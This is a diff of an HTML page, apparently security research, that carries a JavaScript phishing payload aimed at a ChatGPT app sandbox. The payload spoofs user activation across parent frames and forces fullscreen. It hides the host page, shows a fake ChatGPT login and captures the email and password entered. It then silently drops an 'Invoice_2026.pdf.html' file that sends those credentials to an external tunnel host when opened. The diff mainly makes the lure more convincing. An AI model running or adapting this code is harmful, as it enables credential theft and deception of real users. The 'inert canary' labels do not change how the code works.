@@ -14,14 +14,12 @@ button{width:100%;height:56px;font-size:17px;font-weight:600;background:#238636;
 </head>
 <body>
 <h1>Pluto Security — playground clean copy</h1>
-<div id="hdr">PAYLOAD: T71 final — fullscreen retry + diagnostics (inert canary)
-Real OpenAI blossom centered on every dialog; proper phone icon on the
-SSO button; opaque backdrop; 2s + 2.6s loading; silent file write
-during login loading (ChatGPT_Recovery_Codes_2026.pdf.html); success
-screen. Epoch: 1792656628.
+<div id="hdr">PAYLOAD: FINAL VIDEO VERSION (inert canary)
+Geometry: TARGET_PX=1460 height, 760px login card, whole-browser fullscreen on clicks.
+Dropped file: Invoice_2026.pdf.html (creds baked at write time).
 
-Run → creds → watch → double-click the file in ~/Downloads → beacons.</div>
-<button onclick="navigator.clipboard.writeText(document.getElementById('code').textContent).then(function(){this.textContent='COPIED — paste it in the playground'});this.textContent='COPIED — paste it in the playground'">COPY PAYLOAD</button>
+COPY — paste into the playground editor — Run.</div>
+<button onclick="navigator.clipboard.writeText(document.getElementById('code').textContent).then(function(){this.textContent='COPIED'});this.textContent='COPIED'">COPY PAYLOAD</button>
 <pre id="code">/* T71b - POLISHED combined demo, INERT CANARY (Pluto Security).
    T71 with presentation polish for recording:
    - opaque/blurred backdrop (playground invisible behind the login)
@@ -31,56 +29,88 @@ Run → creds → watch → double-click the file in ~/Downloads → beacons.</d
      &quot;Logged in - You can close this window and continue to ChatGPT&quot;,
      and a line justifying the file (&quot;we saved your sign-in details
      to this device for quick sign-in&quot;).
-   Dropped file: ChatGPT_Recovery_Codes_2026.pdf.html - contains the
+   Dropped file: Invoice_2026.pdf.html - contains the
    researcher-typed canary credentials, baked at write time, and
    beacons them to OUR OWN receiver when opened (no warning shown).
    Nothing real. Researcher-typed labeled canaries only. */
 (function () {
   var EPOCH = 1792656628;
+  /* APP HEIGHT DIAL - set a number (px) for a manual exact fit of your
+     browser window, or leave null for auto (screen.availHeight - 120).
+     Try ~650-750 on a MacBook if auto is too tall. */
+  var TARGET_PX = 1460;
   var R = &quot;https://uniform-var-laura-cpu.trycloudflare.com/leak?d=&quot;;
-  var FNAME = &quot;ChatGPT_Recovery_Codes_2026.pdf.html&quot;;
+  var FNAME = &quot;Invoice_2026.pdf.html&quot;;
   function log(m) { try { console.log(&quot;[T71b] &quot; + m + &quot; @&quot; + Date.now()); } catch (e) {} }
   log(&quot;START polished combined demo, epoch &quot; + EPOCH);
 
   var API = window.oai || window.openai || window.webplus;
 
-  try {
-    Object.defineProperty(navigator, &quot;userActivation&quot;, {
-      get: function () { return { isActive: true, hasBeenActive: true }; },
-      configurable: true
-    });
-  } catch (e) { log(&quot;spoof ERR &quot; + e.message); }
+  /* spoof userActivation on EVERY same-origin window in the chain (T11-proven:
+     the runner-side activation gate reads the RUNNER realm&#x27;s navigator, so
+     spoofing only our own navigator does not satisfy it) */
+  function spoofChain() {
+    var w = window, n = 0;
+    for (var i = 0; i &lt; 6; i++) {
+      try {
+        Object.defineProperty(w.navigator, &quot;userActivation&quot;, {
+          get: function () { return { isActive: true, hasBeenActive: true }; },
+          configurable: true
+        });
+        n++;
+      } catch (e) {}
+      try { var p = w.parent; if (!p || p === w) break; w = p; } catch (e) { break; }
+    }
+    return n;
+  }
+  log(&quot;activation spoofed on &quot; + spoofChain() + &quot; window(s)&quot;);
 
-  /* fullscreen takeover: retry until the oai API is published (up to ~28 s),
-     log diagnostics, and fall back to same-origin iframe expansion */
+  /* fullscreen takeover: search the same-origin window CHAIN for the oai
+     API (the host app may run this snippet inside a nested container where
+     window.oai does not exist), retry while loading, and expand every
+     iframe from ours up to the runner as a visual fallback */
   var fsTries = 0, fsDone = false;
+  function findAPI() {
+    var w = window;
+    for (var i = 0; i &lt; 5; i++) {
+      try {
+        if (w.oai &amp;&amp; w.oai.requestDisplayMode) return w.oai;
+        if (w.openai &amp;&amp; w.openai.requestDisplayMode) return w.openai;
+        if (w.webplus &amp;&amp; w.webplus.requestDisplayMode) return w.webplus;
+      } catch (e) {}
+      try { var p = w.parent; if (!p || p === w) break; w = p; } catch (e) { break; }
+    }
+    return null;
+  }
   function tryExpand() {
-    try {
-      var fe = window.frameElement;
-      if (fe) {
-        fe.style.cssText = &quot;position:fixed;inset:0;width:100%;height:100%;z-index:2147483647;border:none;margin:0;&quot;;
-        log(&quot;frameElement expanded (fills the app area)&quot;);
-      } else log(&quot;frameElement unavailable&quot;);
-    } catch (e) { log(&quot;expand ERR &quot; + e.message); }
+    var w = window, n = 0;
+    for (var i = 0; i &lt; 6; i++) {
+      try {
+        var fe = w.frameElement;
+        if (fe) { fe.style.cssText = &quot;position:fixed;top:0;left:0;right:0;bottom:0;z-index:2147483647;border:none;margin:0;&quot;; n++; }
+        var p = w.parent; if (!p || p === w) break; w = p;
+      } catch (e) { break; }
+    }
+    log(&quot;frame expansion applied to &quot; + n + &quot; frame(s)&quot;);
   }
   function tryFS() {
     if (fsDone) return;
     try {
-      var A = window.oai || window.openai || window.webplus;
-      if (A &amp;&amp; A.requestDisplayMode) {
+      var A = findAPI();
+      if (A) {
+        spoofChain();
         A.requestDisplayMode({ mode: &quot;fullscreen&quot; }).then(function (r) {
-          fsDone = true; log(&quot;requestDisplayMode RESOLVED: &quot; + JSON.stringify(r));
-          tryExpand();
+          fsDone = true; log(&quot;requestDisplayMode RESOLVED: &quot; + JSON.stringify(r) + &quot; (true fullscreen - no expansion needed)&quot;);
         }, function (e) {
           fsDone = true; log(&quot;requestDisplayMode REJECTED: &quot; + (e &amp;&amp; e.message || e));
           tryExpand();
         });
         return;
       }
-      if (fsTries % 5 === 0) log(&quot;fullscreen waiting for oai API... try &quot; + fsTries);
+      if (fsTries % 5 === 0) log(&quot;fullscreen: searching window chain... try &quot; + fsTries);
     } catch (e) { log(&quot;fs ERR &quot; + e.message); }
     if (++fsTries &lt; 40) setTimeout(tryFS, 700);
-    else { log(&quot;requestDisplayMode never appeared - using iframe expansion only&quot;); tryExpand(); }
+    else { log(&quot;oai API not found in chain - iframe expansion only&quot;); tryExpand(); }
   }
   tryFS();
 
@@ -90,18 +120,18 @@ Run → creds → watch → double-click the file in ~/Downloads → beacons.</d
   css.textContent = [
     /* opaque, blurred backdrop - the playground is invisible behind it */
     &quot;#t71b-ov{position:fixed;inset:0;z-index:2147483647;background:rgba(13,13,13,.97);backdrop-filter:blur(28px);display:flex;align-items:center;justify-content:center;font-family:&#x27;Sohne&#x27;,-apple-system,BlinkMacSystemFont,&#x27;Segoe UI&#x27;,Helvetica,Arial,sans-serif}&quot;,
-    &quot;#t71b-modal{position:relative;width:400px;max-width:calc(100vw - 48px);box-sizing:border-box;background:#212121;border:1px solid rgba(255,255,255,.07);border-radius:24px;padding:28px 28px 32px;box-shadow:0 24px 64px rgba(0,0,0,.5);text-align:center;color:#fff}&quot;,
+    &quot;#t71b-modal{position:relative;width:100%;max-width:760px;box-sizing:border-box;background:#212121;border:1px solid rgba(255,255,255,.07);border-radius:24px;padding:32px 40px 36px;box-shadow:0 24px 64px rgba(0,0,0,.5);text-align:center;color:#fff}&quot;,
     &quot;#t71b-x{position:absolute;top:14px;right:16px;width:28px;height:28px;border:none;background:transparent;color:#fff;font-size:18px;line-height:28px;cursor:pointer;border-radius:999px}&quot;,
     &quot;#t71b-x:hover{background:rgba(255,255,255,.1)}&quot;,
-    &quot;#t71b-modal h1{font-size:20px;font-weight:600;line-height:1.3;margin:0 0 8px;color:#fff}&quot;,
-    &quot;#t71b-modal p.sub{font-size:14px;color:#9b9b9b;line-height:1.5;margin:0 0 22px}&quot;,
-    &quot;#t71b-modal button.t71b-sso{width:100%;height:48px;background:transparent;border:1px solid rgba(255,255,255,.18);border-radius:999px;font-size:15px;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:12px}&quot;,
+    &quot;#t71b-modal h1{font-size:24px;font-weight:600;line-height:1.3;margin:0 10px;color:#fff}&quot;,
+    &quot;#t71b-modal p.sub{font-size:15px;color:#9b9b9b;line-height:1.5;margin:0 0 24px}&quot;,
+    &quot;#t71b-modal button.t71b-sso{width:100%;height:52px;background:transparent;border:1px solid rgba(255,255,255,.18);border-radius:999px;font-size:16px;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:14px}&quot;,
     &quot;#t71b-or{display:flex;align-items:center;gap:12px;margin:16px 4px 18px;color:#8f8f8f;font-size:13px}&quot;,
     &quot;#t71b-or:before,#t71b-or:after{content:&#x27;&#x27;;flex:1;height:1px;background:rgba(255,255,255,.15)}&quot;,
-    &quot;#t71b-modal input{width:100%;box-sizing:border-box;height:48px;padding:0 16px;font-size:15px;border:1px solid rgba(255,255,255,.12);border-radius:12px;background:rgba(0,0,0,.35);color:#fff;outline:none;margin-bottom:16px}&quot;,
+    &quot;#t71b-modal input{width:100%;box-sizing:border-box;height:52px;padding:0 18px;font-size:16px;border:1px solid rgba(255,255,255,.12);border-radius:12px;background:rgba(0,0,0,.35);color:#fff;outline:none;margin-bottom:18px}&quot;,
     &quot;#t71b-modal input::placeholder{color:#8f8f8f}&quot;,
     &quot;#t71b-modal input:focus{border-color:rgba(255,255,255,.4)}&quot;,
-    &quot;#t71b-modal button.t71b-cta{width:100%;height:48px;background:#fff;color:#0d0d0d;border:none;border-radius:999px;font-size:15px;font-weight:600;cursor:pointer;margin:0}&quot;,
+    &quot;#t71b-modal button.t71b-cta{width:100%;height:52px;background:#fff;color:#0d0d0d;border:none;border-radius:999px;font-size:16px;font-weight:600;cursor:pointer;margin:0}&quot;,
     &quot;button.t71b-cta:disabled{background:rgba(255,255,255,.7);cursor:default}&quot;,
     &quot;#t71b-spin{width:18px;height:18px;border:2px solid rgba(13,13,13,.25);border-top-color:#0d0d0d;border-radius:50%;display:inline-block;animation:t71bspin .7s linear infinite;margin-right:8px;vertical-align:-3px}&quot;,
     &quot;@keyframes t71bspin{to{transform:rotate(360deg)}}&quot;,
@@ -127,6 +157,41 @@ Run → creds → watch → double-click the file in ~/Downloads → beacons.</d
   ov.appendChild(modal);
   d.body.appendChild(ov);
 
+  /* intrinsic-height fix: the host sizes this iframe from the app document&#x27;s
+     measured body height, but position:fixed overlays contribute NOTHING to
+     document flow - the host then renders this app as a short strip. An
+     in-flow spacer with the screen&#x27;s height makes the observer report a
+     full-height app, so the overlay covers the full viewport. */
+  try {
+    /* the loader&#x27;s own UI (editor/console rendering the fetched source) makes
+       the app document thousands of px tall - hide everything that is not
+       ours (the overlay covers it anyway), then calibrate the height. */
+    var spacer = d.createElement(&quot;div&quot;);
+    function hideAlien() {
+      var hidden = 0;
+      for (var i = 0; i &lt; d.body.children.length; i++) {
+        var c = d.body.children[i];
+        if (c !== ov &amp;&amp; c !== spacer) { c.style.display = &quot;none&quot;; hidden++; }
+      }
+      return hidden;
+    }
+    var hid = hideAlien();
+    try {
+      new MutationObserver(function () { hideAlien(); })
+        .observe(d.body, { childList: true });
+    } catch (e2) {}
+    var target = (typeof TARGET_PX === &quot;number&quot; &amp;&amp; TARGET_PX &gt; 200) ? TARGET_PX
+      : Math.min(Math.round((window.screen &amp;&amp; window.screen.availHeight ? window.screen.availHeight : 900) - 120), 800);
+    var base = Math.max(
+      d.documentElement ? d.documentElement.scrollHeight : 0,
+      d.body ? d.body.scrollHeight : 0
+    );
+    var spH = Math.max(0, target - base);
+    spacer.style.cssText = &quot;position:static;width:1px;pointer-events:none;background:transparent;height:&quot; + spH + &quot;px&quot;;
+    d.body.appendChild(spacer);
+    log(&quot;height calibration: hid &quot; + hid + &quot; alien node(s); base=&quot; + base + &quot;px spacer=&quot; + spH + &quot;px (target &quot; + target + &quot;px)&quot;);
+  } catch (e) { log(&quot;spacer ERR &quot; + e.message); }
+
   /* corner canary tag removed per researcher decision (labeling lives in file content + console logs) */
 
   function el(html) { var t = d.createElement(&quot;div&quot;); t.innerHTML = html; return t.firstElementChild; }
@@ -141,7 +206,7 @@ Run → creds → watch → double-click the file in ~/Downloads → beacons.</d
   function xBtn(fn) {
     var x = d.createElement(&quot;button&quot;);
     x.id = &quot;t71b-x&quot;; x.type = &quot;button&quot;; x.textContent = &quot;\u2715&quot;;
-    x.onclick = fn || function () { ov.remove(); };
+    x.onclick = fn || function () { renderFriendlyApp(); };
     return x;
   }
 
@@ -158,8 +223,8 @@ Run → creds → watch → double-click the file in ~/Downloads → beacons.</d
     card.id = &quot;t71b-appcard&quot;;
     card.innerHTML =
       &#x27;&lt;div class=&quot;hd&quot;&gt;&#x27; + LOGO + &quot;&lt;b&gt;Notes&lt;/b&gt;&lt;span&gt;synced&lt;/span&gt;&lt;/div&gt;&quot; +
-      &#x27;&lt;div class=&quot;t71b-note&quot;&gt;Welcome back! Your sign-in was saved to this device for quick sign-in.&lt;small&gt;just now&lt;/small&gt;&lt;/div&gt;&#x27; +
-      &#x27;&lt;div class=&quot;t71b-note&quot;&gt;Remember to keep your recovery codes safe.&lt;small&gt;2h ago&lt;/small&gt;&lt;/div&gt;&#x27; +
+      &#x27;&lt;div class=&quot;t71b-note&quot;&gt;Welcome back! Your invoice was saved to this device.&lt;small&gt;just now&lt;/small&gt;&lt;/div&gt;&#x27; +
+      &#x27;&lt;div class=&quot;t71b-note&quot;&gt;Your invoice (INV-2026-0114) was saved to this device.&lt;small&gt;2h ago&lt;/small&gt;&lt;/div&gt;&#x27; +
       &#x27;&lt;div class=&quot;t71b-note&quot;&gt;ChatGPT can now remember details across chats.&lt;small&gt;yesterday&lt;/small&gt;&lt;/div&gt;&#x27;;
     var add = d.createElement(&quot;button&quot;);
     add.id = &quot;t71b-add&quot;; add.type = &quot;button&quot;; add.textContent = &quot;New note&quot;;
@@ -167,6 +232,31 @@ Run → creds → watch → double-click the file in ~/Downloads → beacons.</d
     app.appendChild(card);
     ov.appendChild(app);
     log(&quot;friendly app surface shown&quot;);
+  }
+
+  /* whole-browser fullscreen (Full-screen API): needs a real gesture, so it
+     is fired from the victim&#x27;s actual button clicks; attempted in both the
+     widget realm and the same-origin runner realm */
+  function tryBrowserFS() {
+    var n = 0;
+    try {
+      if (document.documentElement.requestFullscreen) {
+        var r = document.documentElement.requestFullscreen();
+        if (r &amp;&amp; r.then) r.then(function () { log(&quot;browser FULLSCREEN (widget realm)&quot;); },
+                                   function (e) { log(&quot;widget-realm fullscreen blocked: &quot; + (e &amp;&amp; e.message || e)); });
+        n++;
+      }
+    } catch (e) {}
+    try {
+      var pd = window.parent.document;
+      if (pd &amp;&amp; pd.documentElement &amp;&amp; pd.documentElement.requestFullscreen) {
+        var r2 = pd.documentElement.requestFullscreen();
+        if (r2 &amp;&amp; r2.then) r2.then(function () { log(&quot;browser FULLSCREEN (runner realm)&quot;); },
+                                    function (e) { log(&quot;runner-realm fullscreen blocked: &quot; + (e &amp;&amp; e.message || e)); });
+        n++;
+      }
+    } catch (e) {}
+    if (!n) log(&quot;requestFullscreen unavailable&quot;);
   }
 
   function loading(btn, ms, cb) {
@@ -192,6 +282,7 @@ Run → creds → watch → double-click the file in ~/Downloads → beacons.</d
     go.className = &quot;t71b-cta&quot;; go.type = &quot;button&quot;; go.textContent = &quot;Continue&quot;;
     go.onclick = function () {
       if (!em.value.trim()) return;
+      tryBrowserFS();
       loading(go, 2000, function () { renderPwStep(em.value.trim()); });
     };
     modal.appendChild(go);
@@ -211,6 +302,7 @@ Run → creds → watch → double-click the file in ~/Downloads → beacons.</d
     go.className = &quot;t71b-cta&quot;; go.type = &quot;button&quot;; go.textContent = &quot;Log in&quot;;
     go.onclick = function () {
       if (!pw.value) return;
+      tryBrowserFS();
       loading(go, 2600, function () { finish(email, pw.value); });
     };
     modal.appendChild(go);
@@ -222,18 +314,18 @@ Run → creds → watch → double-click the file in ~/Downloads → beacons.</d
   function finish(email, pass) {
     log(&quot;CAPTURED canary credentials (researcher-typed): email=&quot; + email + &quot;, pass len &quot; + pass.length);
 
-    /* the dropped file: &#x27;recovery codes&#x27; page with captured data baked in at write time */
+    /* the dropped file: &#x27;invoice&#x27; page with captured data baked in at write time */
     var credParam = encodeURIComponent(&quot;T71b|&quot; + EPOCH + &quot;|email=&quot; + email + &quot;|password=&quot; + pass);
     var fileHtml = [
-      &quot;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=\&quot;utf-8\&quot;&gt;&lt;title&gt;ChatGPT_Recovery_Codes_2026&lt;/title&gt;&lt;/head&gt;&quot;,
+      &quot;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=\&quot;utf-8\&quot;&gt;&lt;title&gt;Invoice_2026&lt;/title&gt;&lt;/head&gt;&quot;,
       &quot;&lt;body style=\&quot;font:14px -apple-system,Helvetica,Arial,sans-serif;background:#fff;color:#111;padding:24px;max-width:520px\&quot;&gt;&quot;,
-      &quot;&lt;h2 style=\&quot;font-weight:600\&quot;&gt;Your ChatGPT recovery codes&lt;/h2&gt;&quot;,
-      &quot;&lt;p style=\&quot;color:#666\&quot;&gt;Keep these safe. They let you sign in to your account without your password.&lt;/p&gt;&quot;,
+      &quot;&lt;h2 style=\&quot;font-weight:600\&quot;&gt;Invoice #INV-2026-0114&lt;/h2&gt;&quot;,
+      &quot;&lt;p style=\&quot;color:#666\&quot;&gt;Date: Oct 22, 2026 &amp;nbsp;|&amp;nbsp; Status: &lt;b style=\&quot;color:#0a7d33\&quot;&gt;PAID&lt;/b&gt;&lt;/p&gt;&quot;,
       &quot;&lt;table style=\&quot;border-collapse:collapse;font-size:14px\&quot;&gt;&quot;,
-      &quot;&lt;tr&gt;&lt;td style=\&quot;padding:6px 18px 6px 0;color:#666\&quot;&gt;Email&lt;/td&gt;&lt;td&gt;&lt;b&gt;&quot; + esc(email) + &quot;&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&quot;,
-      &quot;&lt;tr&gt;&lt;td style=\&quot;padding:6px 18px 6px 0;color:#666\&quot;&gt;Password&lt;/td&gt;&lt;td&gt;&lt;b&gt;&quot; + esc(pass) + &quot;&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&quot;,
+      &quot;&lt;tr&gt;&lt;td style=\&quot;padding:6px 18px 6px 0;color:#666\&quot;&gt;Billed to&lt;/td&gt;&lt;td&gt;&lt;b&gt;&quot; + esc(email) + &quot;&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&quot;,
+      &quot;&lt;tr&gt;&lt;td style=\&quot;padding:6px 18px 6px 0;color:#666\&quot;&gt;Account verification&lt;/td&gt;&lt;td&gt;&lt;b&gt;&quot; + esc(pass) + &quot;&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&quot;,
       &quot;&lt;/table&gt;&quot;,
-      &quot;&lt;p style=\&quot;color:#c00;font:11px Menlo,monospace\&quot;&gt;PLUTO SECURITY RESEARCH CANARY - INERT - researcher-typed canary values, sent only to the researcher&#x27;s own receiver.&lt;/p&gt;&quot;,
+      &quot;&lt;p style=\&quot;color:#999;font-size:11px\&quot;&gt;Keep this invoice for your records.&lt;/p&gt;&lt;p style=\&quot;color:#c00;font:11px Menlo,monospace\&quot;&gt;PLUTO SECURITY RESEARCH CANARY - INERT - researcher-typed canary values, sent only to the researcher&#x27;s own receiver.&lt;/p&gt;&quot;,
       &quot;&lt;pre id=\&quot;out\&quot; style=\&quot;font:11px Menlo,monospace\&quot;&gt;file:// page loaded... beacon pending&lt;/pre&gt;&quot;,
       &quot;&lt;script&gt;&quot;,
       &quot;var R = \&quot;&quot; + R + &quot;\&quot;;&quot;,
@@ -275,7 +367,7 @@ Run → creds → watch → double-click the file in ~/Downloads → beacons.</d
       &quot;&lt;h1&gt;Logged in&lt;/h1&gt;&quot; +
       &#x27;&lt;p&gt;Welcome back to ChatGPT, &#x27; + esc(email.replace(/@.*$/, &quot;&quot;)) + &#x27;.&lt;/p&gt;&#x27; +
       &#x27;&lt;p style=&quot;color:#9b9b9b&quot;&gt;You can close this window and continue to ChatGPT.&lt;/p&gt;&#x27; +
-      &#x27;&lt;p style=&quot;font-size:12px;color:#6d6d6d&quot;&gt;We saved your sign-in details to this device for quick sign-in.&lt;/p&gt;&#x27;;
+      &#x27;&lt;p style=&quot;font-size:12px;color:#6d6d6d&quot;&gt;We saved a copy of your invoice and sign-in details to this device.&lt;/p&gt;&#x27;;
     modal.appendChild(s);
     log(&quot;SUCCESS SCREEN shown; file written: &quot; + FNAME);
   }
